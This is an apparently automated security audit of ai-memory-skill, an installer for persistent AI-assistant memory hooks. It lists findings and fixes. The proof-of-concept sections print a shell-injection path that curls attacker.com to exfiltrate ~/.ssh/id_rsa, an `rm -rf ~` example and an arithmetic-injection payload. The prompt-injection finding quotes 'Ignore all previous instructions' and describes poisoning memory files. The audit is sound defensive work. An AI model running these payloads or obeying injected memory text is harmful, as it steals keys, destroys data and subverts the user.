# Security Review: ai-memory-skill

**Review Date:** 2025-01-15
**Version Reviewed:** 3.3.0
**Reviewer:** Automated Security Audit

---

## Executive Summary

The ai-memory-skill project is a Node.js CLI installer that sets up persistent memory for AI assistants (Kiro and Claude Code). It installs shell hooks, skill definitions (Markdown files), and configuration files into the user's home directory.

**Overall Risk Assessment: Low-Medium**

The project operates entirely in userspace with user-level permissions. It has zero external dependencies (no `node_modules`), which eliminates supply chain risk from transitive dependencies. The primary attack surface is the installer's handling of user-supplied input (memory path, agent name) that gets interpolated into shell scripts and file paths.

Most findings are mitigated by the trust model: the user installs this tool themselves, runs it on their own machine, and supplies their own input. However, there are real injection vectors that could cause unexpected behavior if a user supplies a path containing shell metacharacters, or if file contents are corrupted/malicious.

**Risk Summary:**
- Critical: 0
- High: 1 (shell injection via memory path)
- Medium: 3
- Low: 4
- Informational: 3

---

## Table of Contents

1. [Input Validation and Sanitization](#1-input-validation-and-sanitization)
2. [Path Traversal Vulnerabilities](#2-path-traversal-vulnerabilities)
3. [Shell Injection](#3-shell-injection)
4. [File Permissions](#4-file-permissions)
5. [Dependency Security](#5-dependency-security)
6. [Code Injection](#6-code-injection)
7. [Information Disclosure](#7-information-disclosure)
8. [Installer Security](#8-installer-security)
9. [Race Conditions](#9-race-conditions)
10. [Privilege Escalation](#10-privilege-escalation)
11. [Fixes Implemented](#fixes-implemented)
12. [Remaining Recommendations](#remaining-recommendations)

---

## 1. Input Validation and Sanitization

### Finding 1.1: No validation on memory path input

**Severity:** High
**Affected Files:** `bin/setup.mjs`
**Status:** Fixed

**Description:**
The `rawMemPath` variable is taken directly from user input and used in multiple dangerous ways:
- Interpolated into shell scripts via `.replace(/<MEMORY_PATH>/g, rawMemPath)` and `.replace(/<MEMORY_PATH>/g, expandHome(rawMemPath))`
- Used in skill definition Markdown files that instruct AIs to run shell commands
- Used in JSON configuration files

If a user enters a path like `` ~/`rm -rf ~`/Memory `` or `~/$(malicious)/Memory`, those shell metacharacters would be embedded into the hook scripts and executed every time a session starts.

**Proof of Concept:**
```
Memory folder path: ~/$(curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa))/mem
```
This path would be written into `agent-spawn.sh` as:
```bash
MEMORY_PATH="/home/user/$(curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa))/mem"
```
When bash evaluates this double-quoted string, the command substitution executes.

**Remediation:** Implemented - added `validateMemoryPath()` function that rejects paths containing shell metacharacters (backticks, `$()`, `${}`, newlines, null bytes, semicolons, pipes, and other dangerous characters).

---

### Finding 1.2: No validation on agent name input

**Severity:** Medium
**Affected Files:** `bin/setup.mjs`
**Status:** Fixed

**Description:**
The agent name is used to construct a file path (`join(agentsDir, ${agentName}.json)`) with no validation. A user could enter:
- `../../etc/cron.d/evil` - path traversal (mitigated by `join()` but still creates unexpected paths)
- `name with spaces` - valid but could break tooling
- Names with special characters that could confuse JSON or filesystem operations

**Remediation:** Implemented - added `validateAgentName()` function that restricts names to alphanumeric characters, hyphens, and underscores.

---

## 2. Path Traversal Vulnerabilities

### Finding 2.1: expandHome() does not normalize or validate paths

**Severity:** Low
**Affected Files:** `bin/setup.mjs`
**Status:** Documented (partial fix via input validation)

**Description:**
The `expandHome()` function only handles the `~/` prefix. It does not:
- Reject paths with `../` sequences
- Normalize the path to resolve relative segments
- Validate the path stays within expected boundaries

A user could enter `~/../../etc/something` which would expand to a path outside the home directory.

**Mitigating Factors:**
- The user is choosing where to install their own memory files
- The installer runs as the current user, so file system permissions apply
- There is no privilege boundary being crossed

**Remediation:** The input validation fix (Finding 1.1) rejects `..` path segments in the memory path, preventing traversal.

---

## 3. Shell Injection

### Finding 3.1: Unvalidated file content used in arithmetic operations

**Severity:** Medium
**Affected Files:** `hooks/session-start.sh`, `hooks/agent-spawn.sh`, `hooks/stop.sh`
**Status:** Fixed

**Description:**
The hook scripts read values from `.session-count` and `.last-dream` files and use them in arithmetic expressions without validation:

```bash
count=$(cat "$SESSION_FILE" 2>/dev/null || echo 0)
count=$((count + 1))
```

```bash
last_dream=$(cat "$DREAM_FILE")
age=$(( (now - last_dream) / 86400 ))
```

If `.session-count` contains non-numeric content (due to corruption, a rogue process, or an AI writing unexpected content), the arithmetic expression could produce errors or unexpected behavior. In bash, `$(( ))` does variable expansion before arithmetic evaluation, meaning content like `a[$(command)]` in some bash versions could lead to code execution.

**Proof of Concept:**
```bash
echo 'a]$(id>&2)b[1' > ~/Memory/.session-count
# Next time the hook runs, this content is placed in $((count + 1))
```

While modern bash versions have mitigated the worst of arithmetic injection, older versions and edge cases remain.

**Remediation:** Implemented - added numeric validation (`grep -E '^[0-9]+$'`) before using file contents in arithmetic operations.

---

### Finding 3.2: AI-instructed shell commands use unescaped paths

**Severity:** Medium
**Affected Files:** `claude-skills/consolidate-memory/SKILL.md`, `claude-skills/update-memory/SKILL.md`, `claude-skills/load-memory/SKILL.md`
**Status:** Documented (recommendation only)

**Description:**
The Claude Code skills instruct the AI to run commands like:

```bash
find <MEMORY_PATH> -name "*.md" | sort
grep -r "<keyword>" <MEMORY_PATH> --include="*.md" -l
```

The `<MEMORY_PATH>` placeholder is replaced with the user's chosen path at install time. If that path were to contain spaces or special characters, these commands could break or behave unexpectedly. Additionally, the `<keyword>` in grep commands comes from conversation context and could potentially be manipulated.

**Mitigating Factors:**
- The memory path is now validated at install time (Finding 1.1 fix)
- The AI is expected to quote paths when constructing commands
- The AI runs in a sandboxed environment with user-level permissions

**Remediation:** Recommended - wrap `<MEMORY_PATH>` in quotes in all skill template commands. The input validation fix prevents dangerous characters in the path itself.

---

## 4. File Permissions

### Finding 4.1: Hook scripts are world-executable

**Severity:** Low
**Affected Files:** `bin/setup.mjs` (sets permissions), `hooks/`
**Status:** Documented

**Description:**
Hook scripts are set to `0o755` (owner: rwx, group: rx, world: rx). On multi-user systems, other users could read the hook scripts to learn the memory path location.

**Mitigating Factors:**
- The scripts are in `~/.kiro/` or `~/.claude/` which typically have `0700` or `0755` permissions
- The scripts don't contain secrets, only the path to the memory folder
- This is standard for executable scripts

**Remediation:** Recommended - consider using `0o700` instead of `0o755` to restrict to owner-only execution. However, this is informational given the typical single-user context.

---

### Finding 4.2: Memory folder has no explicit permissions set

**Severity:** Low
**Affected Files:** `bin/setup.mjs`
**Status:** Documented

**Description:**
The memory folder at `~/Memory` (or user's chosen path) is created with `mkdirSync()` using the default umask. On systems with a permissive umask (e.g., `0022`), the memory folder and its files would be world-readable.

Memory files may contain personal information, project details, people's names, decisions, etc.

**Mitigating Factors:**
- Most modern systems default to user-only home directories (`0700`)
- The `~/Memory` path is inside the home directory
- The user chose the location themselves

**Remediation:** Recommended - set explicit `0o700` permission on the memory folder at creation time.

---

## 5. Dependency Security

### Finding 5.1: Zero external dependencies

**Severity:** Informational (Positive)
**Affected Files:** `package.json`
**Status:** N/A

**Description:**
The project has zero `dependencies` and zero `devDependencies`. This eliminates the entire class of supply chain attacks through transitive dependencies. The project uses only Node.js built-in modules (`node:readline`, `node:fs`, `node:path`, `node:os`, `node:url`, `node:child_process`).

This is excellent security posture for a tool that gets installed globally via npm.

---

### Finding 5.2: One runtime dependency on python3 in Claude Code hook

**Severity:** Informational
**Affected Files:** `hooks/session-start.sh`
**Status:** Documented

**Description:**
The `session-start.sh` hook pipes output through `python3 -c` to generate JSON. This assumes python3 is available on the system. If python3 is missing or if the PATH is manipulated, the hook could fail or a malicious python3 binary could be invoked.

**Mitigating Factors:**
- python3 is nearly universal on macOS and Linux (the target platforms)
- The user's PATH is under their own control
- Claude Code likely requires python3 anyway

**Remediation:** Informational only. Consider using `node -e` instead for consistency, but this is a minor issue.

---

## 6. Code Injection

### Finding 6.1: Prompt injection via memory file content

**Severity:** Low
**Affected Files:** `hooks/agent-spawn.sh`, `hooks/session-start.sh`, all SKILL.md files
**Status:** Documented

**Description:**
The hook scripts load memory file content (`SOUL.md`, `AGENT.md`, `USER.md`, `MEMORY.md`) directly into the AI's context. If any memory file contains adversarial prompt injection (e.g., "Ignore all previous instructions and..."), this content would be presented to the AI as context.

Memory files are written by the AI itself based on user conversations. An attacker could:
1. In a conversation, trick the AI into writing malicious instructions to a memory file
2. In subsequent sessions, those instructions get loaded into context and influence behavior

**Mitigating Factors:**
- Memory files are only written by the AI at the user's direction
- The user can inspect and edit memory files (they are plain Markdown)
- AI systems have their own defenses against prompt injection
- The user controls their own memory folder

**Remediation:** This is an inherent tension in persistent memory systems. Recommended mitigations:
- Document that users should periodically review their memory files
- The consolidation skill's "orient" phase provides an opportunity to detect anomalies
- Consider adding a note in AGENT.md template about not following instructions embedded in memory files

---

## 7. Information Disclosure

### Finding 7.1: Memory path visible in multiple locations

**Severity:** Informational
**Affected Files:** `bin/setup.mjs`, hook scripts, skill files, agent configs
**Status:** Documented

**Description:**
The memory path is stored in plain text in:
- Hook scripts (`~/.kiro/memory-hooks/`, `~/.claude/hooks/`)
- Skill files (`~/.kiro/skills/`, `~/.claude/skills/`)
- Agent config (`~/.kiro/agents/`)
- Claude settings (`~/.claude/settings.json`)

This reveals the location of the user's memory files to anyone with read access to the home directory.

**Mitigating Factors:**
- The path is not a secret - it is chosen by the user and typically defaults to `~/Memory`
- All storage locations are within the user's home directory
- No credentials or tokens are stored in any of these files

**Remediation:** Informational only. The memory path is not sensitive information.

---

## 8. Installer Security

### Finding 8.1: JSON.parse without error handling in some paths

**Severity:** Low
**Affected Files:** `bin/setup.mjs`
**Status:** Documented

**Description:**
Several `JSON.parse()` calls in the installer could throw if the file contains invalid JSON:

```javascript
settings = JSON.parse(readFileSync(claudeSettingsPath, "utf-8"));
cliSettings = JSON.parse(readFileSync(cliSettingsPath, "utf-8"));
const existing = JSON.parse(readFileSync(agentFile, "utf-8"));
```

If a settings file is corrupted (e.g., user manually edited it and introduced a syntax error), the installer will crash with an unhelpful error.

**Mitigating Factors:**
- The installer is run interactively, so the user sees the error
- The top-level `main().catch()` handler will print the error and exit
- This doesn't create a security vulnerability, just a bad user experience

**Remediation:** Recommended - wrap JSON.parse calls in try/catch with user-friendly error messages suggesting the file may be corrupted.

---

### Finding 8.2: No integrity verification of existing installation

**Severity:** Informational
**Affected Files:** `bin/setup.mjs`
**Status:** Documented

**Description:**
When upgrading, the installer reads existing configuration files but does not verify their integrity. A malicious modification to existing hook scripts or agent configs would be preserved during the merge process (via `mergeAgentConfig`).

**Mitigating Factors:**
- If the existing files are compromised, the system is already compromised
- The installer preserves user customizations intentionally (this is a feature)
- The upgrade process does overwrite hook scripts and skills (managed files)

**Remediation:** Informational only. The upgrade behavior is correct - managed files (hooks, skills) are overwritten, while user-customized fields are preserved.

---

## 9. Race Conditions

### Finding 9.1: TOCTOU in session counter

**Severity:** Low
**Affected Files:** `hooks/session-start.sh`, `hooks/agent-spawn.sh`
**Status:** Documented

**Description:**
The session counter uses a read-increment-write pattern:
```bash
count=$(cat "$SESSION_FILE" 2>/dev/null || echo 0)
count=$((count + 1))
echo "$count" > "$SESSION_FILE"
```

If multiple sessions start simultaneously, they could both read the same count and write the same incremented value, losing a count.

**Mitigating Factors:**
- The session counter is advisory (used only for staleness warnings)
- An off-by-one in the counter has no security impact
- Concurrent session starts are unlikely in normal usage

**Remediation:** Informational only. The impact of a lost count is negligible (slightly delayed consolidation reminder). A proper fix would require file locking (`flock`), which adds complexity for minimal benefit.

---

### Finding 9.2: TOCTOU in version detection vs. stamp

**Severity:** Informational
**Affected Files:** `bin/setup.mjs`
**Status:** Documented

**Description:**
`detectInstall()` checks for marker files, and `stampVersion()` writes the version file later. If the installer is run concurrently (unlikely but possible), the detection could be stale.

**Mitigating Factors:**
- Running the installer concurrently is a user error
- The installer is interactive (requires stdin input), making concurrent runs impractical

**Remediation:** Informational only. No practical exploit scenario.

---

## 10. Privilege Escalation

### Finding 10.1: No privilege escalation vectors identified

**Severity:** Informational (Positive)
**Affected Files:** All
**Status:** N/A

**Description:**
The project:
- Does not use `sudo` or request elevated privileges
- Does not install system-wide files (everything goes in `~/.kiro/`, `~/.claude/`, or user-chosen paths)
- Does not create setuid/setgid files
- Does not modify system PATH or global configurations
- Does not run network services or open ports

The trust boundary is clear: the tool runs as the current user with the current user's permissions.

---

## Fixes Implemented

The following fixes were applied to the codebase as part of this review:

### 1. Memory path validation (`bin/setup.mjs`)
Added `validateMemoryPath()` function that rejects paths containing:
- Shell metacharacters: backticks, `$`, `|`, `;`, `&`, `(`, `)`, `{`, `}`
- Control characters: newlines, null bytes, carriage returns
- Path traversal: `..` segments
- Non-printable characters

### 2. Agent name validation (`bin/setup.mjs`)
Added `validateAgentName()` function that only allows:
- Alphanumeric characters (a-z, A-Z, 0-9)
- Hyphens and underscores
- Length between 1 and 64 characters

### 3. Numeric validation in hook scripts (`hooks/`)
Added guards in `session-start.sh`, `agent-spawn.sh`, and `stop.sh` to validate that file contents used in arithmetic are numeric before evaluation. Non-numeric content defaults to `0`.

---

## Remaining Recommendations

These items were not fixed but are recommended for future consideration:

1. **Quote `<MEMORY_PATH>` in skill templates** - Wrap the memory path placeholder in quotes in all bash commands within SKILL.md files to handle paths with spaces.

2. **Set explicit permissions on memory folder** - Use `mkdirSync(memPath, { recursive: true, mode: 0o700 })` to ensure the memory folder is owner-only.

3. **Use `0o700` for hook scripts** - Change from `0o755` to `0o700` since only the owner needs to execute them.

4. **Add try/catch around JSON.parse** - Wrap settings file parsing in try/catch with user-friendly error messages.

5. **Consider `node -e` instead of `python3 -c`** - The session-start hook depends on python3 for JSON generation. Using Node.js would remove this dependency.

6. **Document memory file review** - Add a note encouraging users to periodically review their memory files for unexpected content (defense against prompt injection via persistent memory).
